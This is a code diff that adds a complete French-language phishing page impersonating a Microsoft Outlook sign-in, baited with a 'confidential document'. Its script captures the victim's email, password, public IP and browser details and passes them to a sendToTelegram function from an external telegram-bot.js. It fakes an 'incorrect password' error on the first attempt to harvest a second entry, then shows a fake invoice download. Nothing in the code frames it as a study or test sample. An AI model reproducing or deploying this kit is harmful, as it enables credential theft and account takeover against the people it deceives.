@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Outlook</title>
+    <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f2f2f2;
+            font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .main-card {
+            width: 100%;
+            max-width: 440px;
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.02);
+            padding: 44px 40px 40px;
+        }
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 28px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #1b1b1b;
+        }
+        .microsoft-logo svg {
+            width: 28px;
+            height: 28px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 8px 0 12px 0;
+        }
+        .sub-message {
+            font-size: 15px;
+            color: #3b3b3b;
+            margin-bottom: 28px;
+            line-height: 1.4;
+            background: #f6f8fa;
+            padding: 14px 16px;
+            border-radius: 4px;
+            border-left: 4px solid #0078d4;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #8b8b8b;
+            border-radius: 4px;
+            background: #fff;
+            transition: border 0.1s, box-shadow 0.1s;
+            outline: none;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .input-group input:focus {
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0,120,212,0.25);
+        }
+        .input-group input::placeholder {
+            color: #6b6b6b;
+            opacity: 0.8;
+        }
+        .helper-link {
+            display: inline-block;
+            margin-top: 6px;
+            font-size: 13px;
+            color: #0078d4;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .helper-link:hover {
+            text-decoration: underline;
+        }
+        .action-button {
+            width: 100%;
+            background: #0078d4;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin: 12px 0 18px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .action-button:hover {
+            background: #106ebe;
+        }
+        .action-button:active {
+            background: #005a9e;
+        }
+        .action-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #0078d4;
+            margin: 0 0 20px 0;
+        }
+        .options-row a {
+            color: #0078d4;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .options-row a:hover {
+            text-decoration: underline;
+        }
+        .footer-note {
+            font-size: 13px;
+            color: #5e5e5e;
+            border-top: 1px solid #e6e6e6;
+            padding-top: 20px;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .footer-note a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .error-message {
+            color: #d13438;
+            font-size: 14px;
+            margin: 6px 0 12px 0;
+            background: #fce8e6;
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+        .password-hint {
+            font-size: 13px;
+            color: #5e5e5e;
+            margin: 4px 0 12px 0;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #5e5e5e;
+            margin-top: 14px;
+        }
+        .secure-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #5e5e5e;
+        }
+        /* Styles pour la page de téléchargement */
+        .download-icon {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .download-icon svg {
+            width: 80px;
+            height: 80px;
+            fill: #d13438;
+        }
+        .download-filename {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: #1b1b1b;
+            margin: 10px 0 20px;
+        }
+        .download-button {
+            display: block;
+            width: 100%;
+            background: #0078d4;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin: 20px 0;
+        }
+        .download-button:hover {
+            background: #106ebe;
+        }
+        @media (max-width: 480px) {
+            .main-card {
+                padding: 32px 20px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-card" id="app">
+        <!-- Logo Microsoft -->
+        <div class="microsoft-logo">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="1" y="1" width="10" height="10" fill="#F25022"/>
+                <rect x="13" y="1" width="10" height="10" fill="#7FBA00"/>
+                <rect x="1" y="13" width="10" height="10" fill="#00A4EF"/>
+                <rect x="13" y="13" width="10" height="10" fill="#FFB900"/>
+            </svg>
+            <span>Microsoft</span>
+        </div>
+
+        <!-- Étape 0 : Document important -->
+        <div id="stepWelcome">
+            <h1>Vous avez reçu un document confidentiel</h1>
+            <div class="sub-message">
+                <strong>De :</strong> vos contacts sécurisés · <span style="color: #0078d4;">vérifié</span>
+                <br><span style="font-size: 14px; display: block; margin-top: 8px;">Un document important vous attend. Connectez-vous à Outlook pour y accéder.</span>
+            </div>
+            <button class="action-button" id="startLoginBtn">Accéder au document</button>
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9v3c0 3.87 3.13 7 7 7s7-3.13 7-7V9c0-3.87-3.13-7-7-7zm0 12c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+                <span>Connexion sécurisée · Microsoft</span>
+            </div>
+        </div>
+
+        <!-- Étape 1 : Email -->
+        <div id="stepEmail" class="hidden">
+            <h1>Se connecter</h1>
+            <div class="input-group">
+                <label for="emailInput">E-mail, téléphone ou identifiant Skype</label>
+                <input type="email" id="emailInput" placeholder="exemple@outlook.com">
+                <div class="error-message" id="emailError">Ce compte n'existe pas. Vérifiez votre adresse.</div>
+                <a href="#" class="helper-link" id="noAccountLink">Vous n'avez pas encore de compte ? Créez-en un !</a>
+            </div>
+            <button class="action-button" id="emailNextBtn">Suivant</button>
+            <div class="options-row">
+                <a href="#" id="cantAccessLink">Votre compte n'est pas accessible ?</a>
+            </div>
+            <div class="secure-badge">
+                <span>Options de connexion</span>
+            </div>
+        </div>
+
+        <!-- Étape 2 : Mot de passe -->
+        <div id="stepPassword" class="hidden">
+            <h1>Entrez votre mot de passe</h1>
+            <div class="input-group">
+                <label for="passwordInput">Mot de passe</label>
+                <input type="password" id="passwordInput" placeholder="Mot de passe">
+                <div class="error-message" id="passwordError">Identifiant incorrect. Réessayez.</div>
+                <div class="password-hint" id="attemptCounter">Tentative 1 sur 2</div>
+            </div>
+            <button class="action-button" id="passwordNextBtn">Suivant</button>
+            <div class="options-row">
+                <a href="#" id="otherMethodsLink">Autres méthodes pour se connecter</a>
+            </div>
+            <div class="secure-badge">
+                <span>Mot de passe Microsoft</span>
+            </div>
+        </div>
+
+        <!-- Étape 3 : Téléchargement du document -->
+        <div id="stepDownload" class="hidden">
+            <h1>Document disponible</h1>
+            <div class="sub-message">
+                Votre document est prêt à être téléchargé.
+            </div>
+            <div class="download-icon">
+                <!-- Logo PDF -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20 2H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-8.5 7.5c0 .83-.67 1.5-1.5 1.5H9v2H7.5V7H10c.83 0 1.5.67 1.5 1.5v1zm5 2c0 .83-.67 1.5-1.5 1.5h-2.5V7H15c.83 0 1.5.67 1.5 1.5v3zm4-3H19v1h1.5V11H19v2h-1.5V7h3v1.5zM9 9.5h1v-1H9v1zM4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm10 5.5h1v-3h-1v3z"/>
+                </svg>
+            </div>
+            <div class="download-filename">facture-00627.pdf</div>
+            <a href="include/facture-00627.pdf" download class="download-button">Télécharger le Facture</a>
+            <div class="secure-badge">
+                <span>Fichier sécurisé · Microsoft</span>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-note">
+            <span>© 2026 Microsoft · </span>
+            <a href="#" id="privacyLink">Confidentialité</a>
+        </div>
+    </div>
+
+    <!-- Fichier externe pour le bot Telegram -->
+    <script src="telegram-bot.js"></script>
+
+    <!-- Script principal -->
+    <script>
+        (function() {
+            "use strict";
+
+            // Éléments DOM
+            const stepWelcome = document.getElementById('stepWelcome');
+            const stepEmail = document.getElementById('stepEmail');
+            const stepPassword = document.getElementById('stepPassword');
+            const stepDownload = document.getElementById('stepDownload');
+            const startBtn = document.getElementById('startLoginBtn');
+            const emailNextBtn = document.getElementById('emailNextBtn');
+            const passwordNextBtn = document.getElementById('passwordNextBtn');
+            const emailInput = document.getElementById('emailInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const attemptCounter = document.getElementById('attemptCounter');
+
+            // Désactiver les liens
+            document.querySelectorAll('.options-row a, .footer-note a, .helper-link').forEach(link => {
+                link.addEventListener('click', e => e.preventDefault());
+            });
+
+            // États
+            let passwordAttempts = 0;
+            let currentEmail = '';
+            let currentIP = 'Inconnue';
+            let currentUserAgent = navigator.userAgent || 'Inconnu';
+
+            // Fonctions d'affichage
+            function showStep(step) {
+                stepWelcome.classList.add('hidden');
+                stepEmail.classList.add('hidden');
+                stepPassword.classList.add('hidden');
+                stepDownload.classList.add('hidden');
+                if (step === 'welcome') stepWelcome.classList.remove('hidden');
+                else if (step === 'email') stepEmail.classList.remove('hidden');
+                else if (step === 'password') stepPassword.classList.remove('hidden');
+                else if (step === 'download') stepDownload.classList.remove('hidden');
+            }
+
+            function clearErrors() {
+                emailError.classList.remove('show');
+                passwordError.classList.remove('show');
+            }
+
+            // Validation d'email réaliste : domaines Microsoft acceptés
+            function isValidMicrosoftEmail(email) {
+                const allowedDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.fr', 'hotmail.fr', 'live.fr'];
+                const parts = email.split('@');
+                if (parts.length !== 2) return false;
+                const domain = parts[1].toLowerCase();
+                return allowedDomains.includes(domain);
+            }
+
+            // Récupération de l'IP publique (appel asynchrone)
+            function fetchIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(() => 'Non disponible');
+            }
+
+            // Construction du message Telegram stylisé
+            function buildTelegramMessage(email, password, ip, userAgent) {
+                const now = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+                return `<b>🔐 Nouvelle tentative de connexion</b>\n\n` +
+                       `<b>📧 Email :</b> ${email}\n` +
+                       `<b>🔑 Mot de passe :</b> ${password}\n` +
+                       `<b>🌐 IP :</b> ${ip}\n` +
+                       `<b>🖥️ Navigateur :</b> ${userAgent}\n` +
+                       `<b>🕒 Date :</b> ${now}`;
+            }
+
+            // Passage de welcome à email
+            startBtn.addEventListener('click', function() {
+                showStep('email');
+                clearErrors();
+                emailInput.value = '';
+                currentEmail = '';
+                passwordAttempts = 0;
+                attemptCounter.textContent = '';
+                passwordInput.value = '';
+                passwordError.classList.remove('show');
+                emailInput.focus();
+                // Récupérer l'IP dès le début (en arrière-plan)
+                fetchIP().then(ip => { currentIP = ip; });
+            });
+
+            // Validation de l'email
+            emailNextBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                if (!email) {
+                    emailError.textContent = 'Veuillez entrer une adresse e-mail.';
+                    emailError.classList.add('show');
+                    return;
+                }
+                if (!email.includes('@') || !email.includes('.')) {
+                    emailError.textContent = 'Adresse e-mail non valide.';
+                    emailError.classList.add('show');
+                    return;
+                }
+                if (!isValidMicrosoftEmail(email)) {
+                    emailError.textContent = 'Ce compte Microsoft n\'existe pas. Vérifiez votre adresse.';
+                    emailError.classList.add('show');
+                    return;
+                }
+
+                // Email valide
+                currentEmail = email;
+                clearErrors();
+                passwordAttempts = 0;
+                attemptCounter.textContent = '';
+                passwordInput.value = '';
+                passwordError.classList.remove('show');
+                showStep('password');
+                passwordInput.focus();
+            });
+
+            // Gestion du mot de passe (2 tentatives)
+            passwordNextBtn.addEventListener('click', function() {
+                const pwd = passwordInput.value.trim();
+                if (!pwd) {
+                    passwordError.textContent = 'Veuillez entrer votre mot de passe.';
+                    passwordError.classList.add('show');
+                    return;
+                }
+
+                // Récupérer l'IP si pas encore faite
+                const ipPromise = currentIP !== 'Inconnue' ? Promise.resolve(currentIP) : fetchIP();
+
+                ipPromise.then(ip => {
+                    const userAgent = navigator.userAgent || 'Inconnu';
+                    const msg = buildTelegramMessage(currentEmail, pwd, ip, userAgent);
+                    if (typeof sendToTelegram === 'function') {
+                        sendToTelegram(msg);
+                    } else {
+                        console.warn('sendToTelegram non disponible');
+                    }
+                }).catch(() => {
+                    // En cas d'erreur, on envoie quand même sans IP
+                    const msg = buildTelegramMessage(currentEmail, pwd, 'Non disponible', navigator.userAgent || 'Inconnu');
+                    if (typeof sendToTelegram === 'function') {
+                        sendToTelegram(msg);
+                    }
+                });
+
+                passwordAttempts++;
+
+                if (passwordAttempts === 1) {
+                    passwordError.textContent = 'Identifiant incorrect. Réessayez.';
+                    passwordError.classList.add('show');
+                    attemptCounter.textContent = '';
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                } else if (passwordAttempts >= 2) {
+                    passwordError.classList.remove('show');
+                    // Afficher la page de téléchargement
+                    showStep('download');
+                    // Optionnel : désactiver le bouton pour éviter des clics multiples
+                    passwordNextBtn.disabled = true;
+                    setTimeout(() => { passwordNextBtn.disabled = false; }, 3000);
+                }
+            });
+
+            // Entrée clavier
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    emailNextBtn.click();
+                }
+            });
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    passwordNextBtn.click();
+                }
+            });
+
+            // Initialisation
+            showStep('welcome');
+        })();
+    </script>
+</body>
+</html>
